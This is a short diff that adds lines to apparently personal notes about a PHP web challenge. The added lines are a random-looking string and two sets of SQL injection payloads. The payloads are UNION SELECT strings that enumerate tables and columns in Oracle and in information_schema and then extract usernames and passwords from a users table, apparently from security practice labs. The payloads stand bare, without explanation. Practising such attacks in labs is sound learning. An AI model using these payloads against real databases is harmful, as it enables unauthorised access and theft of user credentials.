@@ -128,3 +128,20 @@ upload file
 http://challenge5a-dungdd.000webhostapp.com/?controller=message&action=messenger
 https://github.com/dungkaito/challenge5a_dungdd/tree/main/Core
 https://www.geeksforgeeks.org/upload-pdf-file-to-mysql-database-for-multiple-records-using-php/
+
+qc24i8oeuro0zh612jwu
+
+1 2 3 4 5 6 7 8 9 10
+q c 2 4 i 8 o e u r 
+o 0 z h 6 1 2 j w u
+
+
+' UNION SELECT table_name,NULL FROM all_tables--
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--
+
+
+
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
+' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
